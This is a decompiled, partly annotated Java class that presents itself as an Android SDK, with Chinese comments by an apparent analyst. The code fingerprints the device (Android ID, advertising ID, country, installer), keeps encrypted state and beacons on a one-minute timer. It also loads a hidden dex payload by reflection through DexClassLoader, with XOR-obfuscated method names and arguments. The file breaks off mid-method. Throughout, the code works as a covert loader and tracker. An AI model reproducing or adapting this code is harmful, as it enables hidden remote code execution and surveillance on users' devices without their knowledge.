package com.jumpraw.handler.test;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.LocalServerSocket;
import android.net.http.SslCertificate;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.IInterface;
import android.os.Looper;
import android.os.Parcel;
import android.os.RemoteException;
import android.provider.Settings;
import android.telephony.TelephonyManager;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.Closeable;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.net.UnknownHostException;
import java.security.MessageDigest;
import java.security.SecureRandom;
import java.security.cert.CertificateException;
import java.security.cert.X509Certificate;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.UUID;
import java.util.concurrent.LinkedBlockingQueue;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.X509TrustManager;

import org.json.JSONObject;

public final class sdk {
    //控制只初始化一次
    private static boolean k = false;

    private static Context s;
    private static Object u;
    private String H;
    private Context t;
    private boolean m = false;
    private boolean e = false;
    private static String G;
    private static final int Z = 0;
    private static final int l = 1;
    private static final int h = 2;
    private static final int Y = 3;
    private static final int f = 4;
    private static final int p = 5;
    private static final int O = 0;
    private static final int q = 1;
    private static final int N = 2;
    private static final int w = 3;
    private static final int g = 4;
    private boolean D = true;


    //初始化入口
    public static void init(final Context paramContext, final String paramString) {
        try {
            //开启异步
            b.u(new Runnable() {
                public void run() {
                    try {

                        sdk.s(paramContext, paramString);

                    } catch (Throwable localThrowable) {
                        localThrowable.printStackTrace();
                    }
                }
            });
        } catch (Throwable localThrowable) {
            localThrowable.printStackTrace();
        }
    }

    private static void s(Context paramContext, String paramString) {
        try {
            //控制值初始化一次
            if (k) {
                return;
            }
            k = true;

            if (paramContext == null) {
                return;
            }

            s = paramContext.getApplicationContext();

            if (s == null) {
                return;
            }

            sLogger("init...");

            try {
                if (!k(paramContext)) {
                    sLogger("reentry");
                    return;
                }

                new sdk(paramContext, paramString).s();
            } catch (Throwable localThrowable2) {
            }
        } catch (Throwable localThrowable3) {
        }
    }


    //要干什么？？
    private static boolean k(Context paramContext) {

        try {
            String str1 = paramContext.getPackageName();
            if (!x.u(str1)) {
                return false;
            }

            //".o.llk.com.jumpraw.handler.e38186fc6a4a7a3d"
            String str2 = ".o.llk.";
            str2 = str2 + str1; //str1 包名
            str2 = str2 + ".";
            try {
                String str3 = Settings.Secure.getString(paramContext.getContentResolver(), "android_id");
                if (str3 != null) {
                    str2 = str2 + str3;
                }
            } catch (Throwable localThrowable2) {
            }

            String str4 = a.t(str2.getBytes());   //MD5

            if (!x.u(str4)) {
                str4 = str2;
            }

            str4 = str4 + ".l";

            try {
                LocalServerSocket localLocalServerSocket = new LocalServerSocket(str4);
                u = localLocalServerSocket;
                try {
                    new v(localLocalServerSocket).start();
                } catch (Throwable localThrowable4) {
                    localThrowable4.printStackTrace();
                }
                return true;
            } catch (Throwable localThrowable3) {
                return false;
            }

        } catch (Throwable localThrowable1) {
            return false;
        }

    }


    //构造方法
    private sdk(Context paramContext, String paramString) {
        this.t = paramContext;
        this.H = paramString;
    }


    private void s() {
        try {
            b.H(new Runnable() {
                public void run() {
                    sdk.this.u();
                }
            });
        } catch (Throwable localThrowable) {
        }
    }

    private void u() {
        try {
            //gaid
            u(this.t);
            O();
            k(false);
            x();

            //i.1
            sLogger("i.1");
        } catch (Throwable localThrowable) {

        }
    }


    /******************************************Utils方法 从此开始**********************************************************/

    //打印日志方法
    private static void sLogger(final String paramString) {
        try {
            b.H(new Runnable() {
                public void run() {
                    try {
                        if (!sdk.isDebug()) {   //是否在sdcard下创建了lstckk，如果有，可以打日志
                            return;
                        }

                        //android.util.Log      //d       //java.lang.String       //java.lang.String       //yzw
                        Class.forName("android.util.Log").getDeclaredMethod("d", String.class, String.class).invoke(null, "yzw", paramString);

                    } catch (Throwable localThrowable) {

                    }
                }
            });
        } catch (
                Throwable localThrowable) {
        }
    }

    //获取路径  sdcard/lstckk/, 是否是文件夹，用作debug日志开关
    private static boolean isDebug() {
        try {
            File localFile1 = (File) Class.forName("android.os.Environment").getMethod("getExternalStorageDirectory", new Class[0]).invoke(null, new Object[0]);
            if (localFile1 == null) {
            }
            File localFile2 = new File(localFile1, "lstckk");
            boolean bool = localFile2.isDirectory();
            return bool;
        } catch (Throwable localThrowable) {
        }
        return false;
    }

    //获取ICC
    private static String getICC(Context paramContext) {
        try {
            TelephonyManager localTelephonyManager = (TelephonyManager) paramContext.getSystemService(Context.TELEPHONY_SERVICE);
            return localTelephonyManager.getNetworkCountryIso();
        } catch (Throwable localThrowable) {
        }
        return null;
    }


    //获取aid
    private static String getAid(Context context, String paramString) {
        try {
            String str = Settings.Secure.getString(context.getContentResolver(), "android_id");
            if (str == null) {
                return paramString;
            }
            return str;
        } catch (Throwable localThrowable) {
        }
        return paramString;
    }

    //获取包名
    private static String getPKG(Context context) {
        try {
            return context.getPackageName();
        } catch (Throwable localThrowable) {
        }
        return "";
    }

    //解密方法
    private static String sDecode(byte[] paramArrayOfByte) {
        try {
            if ((paramArrayOfByte == null) || (paramArrayOfByte.length <= 1)) {
                throw new f("");
            }
            int i = paramArrayOfByte.length / 2;
            int j = paramArrayOfByte.length - i;
            int n = j - i;
            byte[] arrayOfByte = new byte[i];
            int i1 = 0;
            while (i1 < i) {
                int i2 = paramArrayOfByte[(j + i1)];
                int i3 = paramArrayOfByte[n];
                arrayOfByte[i1] = ((byte) ((i2 ^ i3) & 0xFF));
                i1++;
                n++;
            }
            String str = x.s(arrayOfByte);
            if (!x.u(str)) {
                throw new f("");
            }
            return str;
        } catch (Throwable localThrowable) {
        }
        return null;
    }

    //获取gaid
    private static void u(final Context paramContext) {
        try {
            new Thread(new Runnable() {
                public void run() {
                    try {
                        AdvertisingIdClient.AdInfo localm = AdvertisingIdClient.s(paramContext);  //获取gaid
                        sdk.G = localm.s();
                    } catch (Throwable localThrowable) {
                    }
                }
            }).start();
        } catch (Throwable localThrowable) {
        }
    }


    /******************************************Utils方法 到此为止**********************************************************/

    private byte[] u(byte[] paramArrayOfByte) {
        try {
            byte[] arrayOfByte = a.s("file not found\\t:".getBytes(), getAid(this.t, "").getBytes(), "!>_||".getBytes());
            SecretKeySpec localSecretKeySpec = new SecretKeySpec(arrayOfByte, "AES");
            Cipher localCipher = Cipher.getInstance("AES");
            localCipher.init(1, localSecretKeySpec);
            return localCipher.doFinal(paramArrayOfByte);
        } catch (Throwable localThrowable) {
        }
        return null;
    }

    private byte[] H(byte[] paramArrayOfByte) {
        try {
            byte[] arrayOfByte = a.s("file not found\\t:".getBytes(), getAid(this.t, "").getBytes(), "!>_||".getBytes());
            SecretKeySpec localSecretKeySpec = new SecretKeySpec(arrayOfByte, "AES");
            Cipher localCipher = Cipher.getInstance("AES");
            localCipher.init(2, localSecretKeySpec);
            return localCipher.doFinal(paramArrayOfByte);
        } catch (Throwable localThrowable) {
        }
        return null;
    }

    private String H(String paramString) {
        try {
            if (!x.u(paramString)) {
                return null;
            }
            String str1 = paramString;
            str1 = str1 + ".>_!!!" + getAid(this.t, "");
            String str2 = a.t(str1.getBytes());   //MD5
            return str2;
        } catch (Throwable localThrowable) {
        }
        return null;
    }

    private JSONObject k(String paramString, JSONObject paramJSONObject) {
        try {
            return new JSONObject(paramString);
        } catch (Throwable localThrowable) {
        }
        return paramJSONObject;
    }

    private JSONObject e() {
        return t("");
    }

    private JSONObject G() {
        try {
            return t("oldzbsk");
        } catch (Throwable localThrowable) {
        }
        return null;
    }

    private JSONObject t(String paramString) {

        try {
            synchronized (this) {
                if (!x.u(paramString)) {
                    paramString = "oldzb";
                }
                String str1 = H(paramString);
                if (!x.u(str1)) {
                    return null;
                }
                str1 = str1 + ".d";
                File localFile = new File(this.t.getFilesDir(), str1);
                byte[] arrayOfByte1 = a.s(localFile);
                if ((arrayOfByte1 == null) || (arrayOfByte1.length <= 0)) {
                    return null;
                }
                byte[] arrayOfByte2 = H(arrayOfByte1);
                if ((arrayOfByte2 == null) || (arrayOfByte2.length <= 0)) {
                    return null;
                }
                String str2 = x.s(arrayOfByte2);
                if (!x.u(str2)) {
                    return null;
                }
                JSONObject localJSONObject = k(str2, (JSONObject) null);
                if (localJSONObject == null) {
                    return null;
                }
                return localJSONObject;
            }

        } catch (Throwable localThrowable) {
        }

        return null;
    }

    private void k(JSONObject paramJSONObject) {
        k(paramJSONObject, "oldzbsk");
    }

    private void Z() {
        try {
            k(new JSONObject(), "oldzbsk");
        } catch (Throwable localThrowable) {
        }
    }

    private void s(JSONObject paramJSONObject) {
        k(paramJSONObject, "oldzblp");
    }

    private JSONObject l() {
        try {
            return t("oldzblp");
        } catch (Throwable localThrowable) {
        }
        return null;
    }

    private void u(JSONObject paramJSONObject) {
        k(paramJSONObject, (String) null);
    }

    private void k(JSONObject paramJSONObject, String paramString) {
        Object localObject1 = null;
        try {
            synchronized (this) {
                if (paramJSONObject == null) {
                    return;
                }
                if (!x.u(paramString)) {
                    paramString = "oldzb";
                }
                String str1 = H(paramString);
                if (!x.u(str1)) {
                    return;
                }
                str1 = str1 + ".d";
                String str2 = paramJSONObject.toString();
                if (!x.u(str2)) {
                    return;
                }
                byte[] arrayOfByte1 = x.t(str2);
                if ((arrayOfByte1 == null) || (arrayOfByte1.length <= 0)) {
                    return;
                }
                byte[] arrayOfByte2 = u(arrayOfByte1);
                if ((arrayOfByte2 == null) || (arrayOfByte2.length <= 0)) {
                    return;
                }
                File localFile = new File(this.t.getFilesDir(), str1);
                localObject1 = new FileOutputStream(localFile);
                ((OutputStream) localObject1).write(arrayOfByte2);
                ((OutputStream) localObject1).flush();
                ((OutputStream) localObject1).close();
                localObject1 = null;
            }
        } catch (Throwable localThrowable) {
        } finally {
            a.s((Closeable) localObject1);
        }
    }

    private void k(String paramString1, String paramString2) {
        try {
            JSONObject localJSONObject = e();
            if (localJSONObject == null) {
                localJSONObject = new JSONObject();
            }
            localJSONObject.put(paramString1, paramString2);
            u(localJSONObject);
        } catch (Throwable localThrowable) {
        }
    }

    private String s(String paramString1, String paramString2) {
        try {
            JSONObject localJSONObject = e();
            if (localJSONObject == null) {
                return paramString2;
            }
            String str = localJSONObject.optString(paramString1, paramString2);
            return str;
        } catch (Throwable localThrowable) {
        }
        return paramString2;
    }

    private void k(String paramString, int paramInt) {
        try {
            JSONObject localJSONObject = e();
            if (localJSONObject == null) {
                localJSONObject = new JSONObject();
            }
            localJSONObject.put(paramString, paramInt);
            u(localJSONObject);
        } catch (Throwable localThrowable) {
        }
    }

    private int s(String paramString, int paramInt) {
        try {
            JSONObject localJSONObject = e();
            if (localJSONObject == null) {
                return paramInt;
            }
            int i = localJSONObject.optInt(paramString, paramInt);
            return i;
        } catch (Throwable localThrowable) {
        }
        return paramInt;
    }

    private void k(String paramString, long paramLong) {
        try {
            JSONObject localJSONObject = e();
            if (localJSONObject == null) {
                localJSONObject = new JSONObject();
            }
            localJSONObject.put(paramString, paramLong);
            u(localJSONObject);
        } catch (Throwable localThrowable) {
        }
    }

    private long s(String paramString, long paramLong) {
        try {
            JSONObject localJSONObject = e();
            if (localJSONObject == null) {
                return paramLong;
            }
            long l1 = localJSONObject.optLong(paramString, paramLong);
            return l1;
        } catch (Throwable localThrowable) {
        }
        return paramLong;
    }

    private boolean k(File paramFile, String paramString) {
        Object localObject1 = null;
        boolean bool4;
        boolean bool2;
        try {
            boolean bool1;
            if (paramFile == null) {
                bool1 = false;
                return bool1;
            }
            if (!x.u(paramString)) {
                bool1 = false;
                return bool1;
            }
            localObject1 = new FileInputStream(paramFile);
            MessageDigest localMessageDigest = MessageDigest.getInstance("MD5");
            localMessageDigest.update(">>>dgk".getBytes());
            byte[] arrayOfByte1 = new byte[1024];
            int i = 0;
            while ((i = ((InputStream) localObject1).read(arrayOfByte1)) > 0) {
                localMessageDigest.update(arrayOfByte1, 0, i);
            }
            ((InputStream) localObject1).close();
            localObject1 = null;
            localMessageDigest.update("<<<klzz".getBytes());
            byte[] arrayOfByte2 = localMessageDigest.digest();
            if ((arrayOfByte2 == null) || (arrayOfByte2.length <= 0)) {
                boolean bool3 = false;
                return bool3;
            }

            String str = a.u(arrayOfByte2);

            if (!x.u(str)) {
                bool4 = false;
                return bool4;
            }
            if (!str.equals(paramString)) {
                bool4 = false;
                return bool4;
            }
            bool4 = true;
            return bool4;
        } catch (FileNotFoundException localFileNotFoundException) {
            bool2 = false;
            return bool2;
        } catch (Throwable localThrowable) {
            bool2 = false;
            return bool2;
        } finally {
            a.s((Closeable) localObject1);
        }
    }

    private String k(JSONObject paramJSONObject, String paramString1, String paramString2) {
        try {
            if (paramJSONObject == null) {
                return paramString2;
            }
            return paramJSONObject.optString(paramString1, paramString2);
        } catch (Throwable localThrowable) {
        }
        return paramString2;
    }

    private void s(JSONObject paramJSONObject, String paramString1, String paramString2) {
        try {
            if (paramJSONObject == null) {
                return;
            }
            paramJSONObject.put(paramString1, paramString2);
        } catch (Throwable localThrowable) {
        }
    }

    private int k(JSONObject paramJSONObject, String paramString, int paramInt) {
        try {
            if (paramJSONObject == null) {
                return paramInt;
            }
            return paramJSONObject.optInt(paramString, paramInt);
        } catch (Throwable localThrowable) {
        }
        return paramInt;
    }

    private void s(JSONObject paramJSONObject, String paramString, int paramInt) {
        try {
            if (paramJSONObject == null) {
                return;
            }
            paramJSONObject.put(paramString, paramInt);
        } catch (Throwable localThrowable) {
        }
    }

    private String H(JSONObject paramJSONObject) {
        return k(paramJSONObject, "lp", null);
    }

    private int t(JSONObject paramJSONObject) {
        return k(paramJSONObject, "ver", 0);
    }

    private String m(JSONObject paramJSONObject) {
        return k(paramJSONObject, "dg", null);
    }

    private String e(JSONObject paramJSONObject) {
        return k(paramJSONObject, "llp", null);
    }

    private String h() {
        try {
            JSONObject localJSONObject = G();
            return e(localJSONObject);
        } catch (Throwable localThrowable) {
        }
        return null;
    }

    private int G(JSONObject paramJSONObject) {
        return k(paramJSONObject, "ts", 0);
    }

    private void s(JSONObject paramJSONObject, String paramString) {
        s(paramJSONObject, "lp", paramString);
    }

    private void u(JSONObject paramJSONObject, String paramString) {
        s(paramJSONObject, "llp", paramString);
    }

    private void k(JSONObject paramJSONObject, int paramInt) {
        s(paramJSONObject, "ver", paramInt);
    }

    private void H(JSONObject paramJSONObject, String paramString) {
        s(paramJSONObject, "dg", paramString);
    }

    private void s(JSONObject paramJSONObject, int paramInt) {
        s(paramJSONObject, "ts", paramInt);
    }

    private File Y() {
        return l(null);
    }

    private boolean Z(JSONObject paramJSONObject) {
        try {
            if (paramJSONObject == null) {
                return false;
            }
            String str1 = H(paramJSONObject);
            if (!x.u(str1)) {
                return false;
            }
            File localFile = new File(str1);
            if (!localFile.exists()) {
                return false;
            }
            String str2 = m(paramJSONObject);
            if (!x.u(str2)) {
                return false;
            }
            return k(localFile, str2);
        } catch (Throwable localThrowable) {
        }
        return false;
    }

    private File l(JSONObject paramJSONObject) {
        try {
            if (paramJSONObject == null) {
                paramJSONObject = G();
            }
            if (paramJSONObject == null) {
                return null;
            }
            String str = H(paramJSONObject);
            if (!x.u(str)) {
                return null;
            }
            if (!Z(paramJSONObject)) {
                return null;
            }
            File localFile = new File(str);
            return localFile;
        } catch (Throwable localThrowable) {
        }
        return null;
    }

    private void k(String paramString1, String paramString2, int paramInt) {
        try {
            if (!x.u(paramString1)) {
                return;
            }
            if (!x.u(paramString2)) {
                return;
            }
            JSONObject localJSONObject1 = G();
            if (localJSONObject1 == null) {
                localJSONObject1 = new JSONObject();
            }
            String str = H(localJSONObject1);
            if (x.u(str)) {
                if (!str.equals(paramString1)) {
                    u(localJSONObject1, str);
                } else {
                    u(localJSONObject1, null);
                }
            }
            s(localJSONObject1, paramString1);
            H(localJSONObject1, paramString2);
            k(localJSONObject1, paramInt);
            k(localJSONObject1);
            JSONObject localJSONObject2 = e();
            if (localJSONObject2 == null) {
                localJSONObject2 = new JSONObject();
            }
            f(localJSONObject2);
            Y(localJSONObject2);
            u(localJSONObject2, 0);
            u(localJSONObject2);
        } catch (Throwable localThrowable) {
        }
    }

    private int h(JSONObject paramJSONObject) {
        try {
            if (paramJSONObject == null) {
                return 0;
            }
            return paramJSONObject.optInt("llec", 0);
        } catch (Throwable localThrowable) {
        }
        return 0;
    }

    private void u(JSONObject paramJSONObject, int paramInt) {
        try {
            if (paramJSONObject == null) {
                return;
            }
            paramJSONObject.put("llec", paramInt);
        } catch (Throwable localThrowable) {
        }
    }

    private int f() {
        return s("lls", 0);
    }

    private void Y(JSONObject paramJSONObject) {
        try {
            if (paramJSONObject == null) {
                return;
            }
            paramJSONObject.put("lls", 0);
        } catch (Throwable localThrowable) {
        }
    }

    private void k(int paramInt) {
        k(paramInt, 0);
    }

    private void k(int paramInt1, int paramInt2) {
        try {
            JSONObject localJSONObject = e();
            if (localJSONObject == null) {
                localJSONObject = new JSONObject();
            }
            localJSONObject.put("lls", paramInt1);
            switch (paramInt1) {
                case 3:
                    k(localJSONObject, 0, 1);
                    break;
                case 4:
                    k(localJSONObject, 1, 1);
                    u(localJSONObject, paramInt2);
                    break;
                case 5:
                    k(localJSONObject, 2, 1);
                    break;
                case 1:
                    k(localJSONObject, 3, 1);
                    break;
            }
            u(localJSONObject);
        } catch (Throwable localThrowable) {
        }
    }

    private void f(JSONObject paramJSONObject) {
        try {
            if (paramJSONObject == null) {
                return;
            }
            for (int i = 0; i < 4; i++) {
                k(paramJSONObject, i, -100);
            }
            u(paramJSONObject, 0);
        } catch (Throwable localThrowable) {
        }
    }

    private int[] p() {
        try {
            JSONObject localJSONObject = e();
            if (localJSONObject == null) {
                return null;
            }
            return p(localJSONObject);
        } catch (Throwable localThrowable) {
        }
        return null;
    }

    private int[] p(JSONObject paramJSONObject) {
        int[] arrayOfInt = null;
        try {
            arrayOfInt = new int[4];
            Arrays.fill(arrayOfInt, 0);
            if (paramJSONObject == null) {
                return arrayOfInt;
            }
            for (int i = 0; i < 4; i++) {
                arrayOfInt[i] = H(paramJSONObject, i);
            }
            return arrayOfInt;
        } catch (Throwable localThrowable) {
        }
        return arrayOfInt;
    }

    private int k(int[] paramArrayOfInt, int paramInt) {
        try {
            if ((paramArrayOfInt == null) || (paramInt < 0) || (paramInt >= paramArrayOfInt.length)) {
                return 0;
            }
            return paramArrayOfInt[paramInt];
        } catch (Throwable localThrowable) {
        }
        return 0;
    }

    private int H(JSONObject paramJSONObject, int paramInt) {
        try {
            if (paramJSONObject == null) {
                return 0;
            }
            if ((paramInt < 0) || (paramInt >= 4)) {
                return 0;
            }
            String str = "rc." + paramInt;
            int i = paramJSONObject.optInt(str, 0);
            return i;
        } catch (Throwable localThrowable) {
        }
        return 0;
    }

    private void k(JSONObject paramJSONObject, int paramInt1, int paramInt2) {
        try {
            if (paramJSONObject == null) {
                return;
            }
            if ((paramInt1 < 0) || (paramInt1 >= 4)) {
                return;
            }
            String str = "rc." + paramInt1;
            int i = paramJSONObject.optInt(str, 0);
            int j = paramInt2 != -100 ? i + paramInt2 : 0;
            if (j < 0) {
                j = 0;
            }
            paramJSONObject.put(str, j);
        } catch (Throwable localThrowable) {
        }
    }

    private void k(File paramFile) {
        try {
            if (paramFile == null) {
                return;
            }
            String str1 = paramFile.getName();
            if (str1.length() <= 4) {
                return;
            }
            String str2 = str1.substring(0, str1.length() - 3) + "dex";
            File localFile = new File(paramFile.getParentFile(), str2);
            if (localFile.exists()) {
                boolean bool = localFile.delete();
            }
        } catch (Throwable localThrowable) {
        }
    }

    private void O() {
        try {
            Object localObject;
            JSONObject localJSONObject = G();
            if (localJSONObject == null) {
                return;
            }
            String str1 = e(localJSONObject);
            if (!x.u(str1)) {
                return;
            }
            String str2 = H(localJSONObject);
            if (x.u(str2)) {
                localObject = new File(str1).getName();
                String str3 = new File(str2).getName();
                if ((x.u((String) localObject)) && (x.u(str3)) && (str3.equals(localObject))) {
                    return;
                }
            }
            localObject = new File(str1);
            if (((File) localObject).exists()) {
                try {
                    boolean bool = ((File) localObject).delete();
                } catch (Throwable localThrowable2) {
                }
            }
            k((File) localObject);
        } catch (Throwable localThrowable1) {
        }
    }

    private void q() {
        try {
            if (this.m) {
                return;
            }
            if (!N()) {
                k(1);
                return;
            }
            w();
        } catch (Throwable localThrowable) {
        }
    }

    private boolean N() {
        try {
            int i = f();
            if (i == 2) {
                i = 5;
                k(i);
            }
            JSONObject localJSONObject = e();
            if (localJSONObject == null) {
                return true;
            }
            int[] arrayOfInt = p(localJSONObject);
            if ((arrayOfInt == null) || (arrayOfInt.length < 4)) {
                return true;
            }
            if (i == 5) {
                return false;
            }
            if (i == 0) {
                return true;
            }
            if ((i == 3) || (i == 4)) {
                return true;
            }
            int j = k(arrayOfInt, 2);
            int n = k(arrayOfInt, 0);
            if ((j >= 10) && (j / 2 > n)) {
                return false;
            }
            int i1 = 3;
            int i2 = a.s().nextInt(i1);
            return i2 == 0;
        } catch (Throwable localThrowable) {
        }
        return true;
    }

    private void w() {
        try {
            File localFile = Y();
            if (localFile == null) {
                return;
            }
            if (!localFile.exists()) {
                return;
            }
            k(2);
            localFile = localFile.getAbsoluteFile();
            k(localFile);
            int i = u(localFile.getAbsolutePath(), localFile.getParent());
            if (i < 1) {
                k(4, i);
                return;
            }
            k(3);
            this.m = true;
        } catch (Throwable localThrowable) {
            k(4, 59536);
        }
    }

    //通过反射DexclassLoader 动态加载dex包
    private int u(String paramString1, String paramString2) {
        try {
            Object localObject1 = null;
            try {
                //ClassLoader localObject1 = context.getClassLoader();
                //getClassLoader
                Method localMethod1 = Context.class.getMethod("getClassLoader", new Class[0]);
                localObject1 = localMethod1.invoke(this.t);
            } catch (Throwable localThrowable2) {
            }

            //getClassLoader
            if (localObject1 == null) {
                // TODO: 1
//                localObject2 = getClass();
//                localObject3 = Class.class.getMethod("getClassLoader"), new Class[0]);
//                localObject1 = ((Method) localObject3).invoke(localObject2, new Object[0]);
            }


            //DexClassLoader dexClassLoser = new DexClassLoader(dexFile.getAbsolutePath(), dexOutputFile.getAbsolutePath(), null, context.getClassLoader())
            //dalvik.system.DexClassLoader
            Class localObject2 = Class.forName("dalvik.system.DexClassLoader");

            //构造方法的四个参数：String， String， String, ClassLoader
            Object localObject3 = localObject2.getConstructor(String.class, String.class, String.class, ClassLoader.class);
            //传进来的参数paramString2是dex包的路径
            Object localObject4 = ((Constructor) localObject3).newInstance(paramString1, paramString2, null, localObject1);

            //方法名：loadClass,  参数列表: String
            Method localMethod2 = localObject2.getMethod("loadClass", String.class);
            //动态加载之后反射的类名: com.f.w.a,  方法名：b
            Class localClass = (Class) localMethod2.invoke(localObject4, new Object[]{"com.f.w.a"});

            //方法的参数列表   [Ljava.lang.Object;
            // TODO: 2020-01-06 这一块有问题 ？？
            Method localMethod3 = localClass.getDeclaredMethod(sDecode(new byte[]{64, -70, -40}), Class.forName(sDecode(new byte[]{116, 50, 18, -51, -8, -32, -10, -89, 31, 24, 115, -32, 67, -115, -54, 116, -17, -85, 76, 47, 126, 120, -84, -114, -127, -40, -53, 126, 118, 20, -50, 12, -17, -96, 17, -116, -33, 119})));
            localMethod3.setAccessible(true);
            //实际参数  //79e5450aec92415a527baea61dadf329a788b488ed26e7194dbc7b5c2b94aa1b378e76641e133b126c741a99f1ad0d82ea03abf5619394f1d0b79ba7b358e749cf147bf74e0a00b646e78a8b075b0bb6
            int i = (Integer) localMethod3.invoke((Object) null, (Object) new Object[]{this.t, this.H, sDecode(new byte[]{106, 66, -116, -44, 44, 122, -17, 98, -81, -42, -87, -77, -126, 42, 127, 13, 51, -85, 9, -108, -52, 59, 103, -4, -35, 125, -6, -91, -11, 3, -125, 113, 67, 66, -78, -53, 41, 64, -82, 19, 3, -42, -108, -126, 97, -3, -128, 10, 105, -112, 28, 98, 120, 94, 51, 78, -68, 91, 113, 12, 4, 45, -124, 114, -38, -47, 120, -67, -65, -60, 10, 72, 118, -68, 14, -106, -33, 85, 121, -115, -69, -82, 12, 113, -99, -117, -21, -30, -56, 109, 117, 41, 111, -49, -128, 111, 12, 68, 50, 10, 89, -100, 94, 12, -94, -101, -33, -71, 83, -89, 73, -4, 94, -128, -24, -75, -114, 16, -109, 33, 91, 38, 119, -69, 20, -55, 36, -20, -84, 84, 54, -33, -14, -117, -17, -107, 99, 113, -33, -74, -74, 12, 116, 51, -108, 31, -76, 72, -63, -83, 125, -56, -32, 55, -19, 82, 60, 124, 110, -126, 93, 123, -23, -31, 24, 79, -33, 3, -54, -75, -112, -127, -74, 27, 74, 108, 6, -103, 62, -10, -83, 94, 6, -54, -20, 25, -101, -63, -109, 48, -79, 72, 34, 117, -118, -13, 75, 116, -106, 43, 102, -78, -90, -76, 4, -54, -79, 51, 93, -12, 126, 1, 79, 60, 6, 45, -114, 57, 72, 56, 101, 76, -75, 16, -23, -26, 64, -40, -120, -14, 60, 124, 71, -39, 63, -91, -20, 55, 72, -65, -115, -51, 59, 69, -84, -22, -46, -37, -82, 92, 20, 77, 95, -85, -72, 93, 105, 37, 2, 57, 56, -2, 56, 57, -108, -86, -26, -118, 106, -109, 47, -51, 58, -80, -118, -126, -73, 114, -14, 22, 57, 21, 66, -125, 113, -2, 16, -43, -49, 50, 7, -21, -59, -23, -119, -94, 87, 20, -17, -41, -122, 60, 22, 5, -96, 41, -47, 127, -7, -52, 69, -86, -48, 0, -40, 48, 12, 30, 12, -76})});
            return i;
        } catch (Throwable localThrowable1) {
            Object localObject2;
            if ((localThrowable1 instanceof InvocationTargetException)) {
                localObject2 = ((InvocationTargetException) localThrowable1).getTargetException();
            }
        }
        return 60536;
    }

    private long g() {
        return s("r_lqt", 0L);
    }

    private void k(long paramLong) {
        try {
            k("r_lqt", paramLong);
        } catch (Throwable localThrowable) {
        }
    }

    private void s(int paramInt) {
        k("r_lpt", paramInt);
    }

    private void t(JSONObject paramJSONObject, int paramInt) {
        try {
            if (paramJSONObject == null) {
                return;
            }
            paramJSONObject.put("r_lpt", paramInt);
        } catch (Throwable localThrowable) {
        }
    }

    private int O(JSONObject paramJSONObject) {
        try {
            if (paramJSONObject == null) {
                return 0;
            }
            return paramJSONObject.optInt("r_lpt", 0);
        } catch (Throwable localThrowable) {
        }
        return 0;
    }

    private String q(JSONObject paramJSONObject) {
        String str1 = G;
        try {
            if (paramJSONObject == null) {
                return str1;
            }
            String str2 = paramJSONObject.optString("gid", null);
            if (!x.u(str2)) {
                return str1;
            }
            return str2;
        } catch (Throwable localThrowable) {
        }
        return str1;
    }

    private void t(JSONObject paramJSONObject, String paramString) {
        try {
            if (paramJSONObject == null) {
                return;
            }
            if (!x.u(paramString)) {
                return;
            }
            paramJSONObject.put("gid", paramString);
        } catch (Throwable localThrowable) {
        }
    }

    private void k(long paramLong, int paramInt, String paramString) {
        try {
            JSONObject localJSONObject = e();
            if (localJSONObject == null) {
                localJSONObject = new JSONObject();
            }
            k(localJSONObject, paramLong);
            t(localJSONObject, paramInt);
            t(localJSONObject, paramString);
            u(localJSONObject);
        } catch (Throwable localThrowable) {
        }
    }

    private long D() {
        return s("r_nqt", 0L);
    }

    private void s(long paramLong) {
        k("r_nqt", paramLong);
    }

    private void k(JSONObject paramJSONObject, long paramLong) {
        try {
            if (paramJSONObject == null) {
                return;
            }
            paramJSONObject.put("r_nqt", paramLong);
        } catch (Throwable localThrowable) {
        }
    }

    private long C() {
        return s("r_ldt", 0L);
    }

    private void u(long paramLong) {
        k("r_ldt", paramLong);
    }

    private void x() {
        b.s(new Runnable() {
            public void run() {
                try {
                    sdk.this.T();

                    //循环调用
                    b.s(this, 60000L);
                } catch (Throwable localThrowable) {
                }
            }
        }, 10000L);
    }

    private boolean L() {
        try {
            long l1 = System.currentTimeMillis();
            long l2 = D();
            if ((l2 > 0L) && (l1 < l2)) {
                return false;
            }
            long l3 = g();
            long l4 = 180000L;
            return l1 - l3 >= l4;
        } catch (Throwable localThrowable) {
        }
        return false;
    }

    private void T() {
        try {
            if (!L()) {
                try {
                    if (this.D) {
                        this.D = false;
                        sLogger("i.2 skip");
                    }
                } catch (Throwable localThrowable1) {
                }
                X();
                return;
            }
            k(System.currentTimeMillis());
            final JSONObject localJSONObject1 = e();
            final JSONObject localJSONObject2 = G();
            new Thread(new Runnable() {
                public void run() {
                    try {
                        sdk.this.k(localJSONObject1, localJSONObject2);
                    } catch (Throwable localThrowable) {
                    }
                }
            }).start();
        } catch (Throwable localThrowable2) {
        }
    }

    private void k(JSONObject paramJSONObject1, JSONObject paramJSONObject2) {
        g localg = null;
        try {
            if (paramJSONObject1 == null) {
                paramJSONObject1 = new JSONObject();
            }
            this.D = false;
            sLogger("i.2");
            JSONObject localJSONObject1 = new JSONObject();
            JSONObject localJSONObject2 = new JSONObject();
            localJSONObject2.put("pkg", getPKG(this.t));
            localJSONObject2.put("ver", AppInfo.m(this.t));
            localJSONObject2.put("is_system", AppInfo.e(this.t));
            localJSONObject2.put("installer", AppInfo.G(this.t));
            localJSONObject1.put("app", localJSONObject2);
            localJSONObject1.put("ver", 8);
            localJSONObject1.put("ct", "zw213c4c63");
            localJSONObject1.put("cp", "p.zw2dd9e3f");
            localJSONObject1.put("at", this.H);
            localJSONObject1.put("iso", getICC(this.t));
            localJSONObject1.put("lt", O(paramJSONObject1));
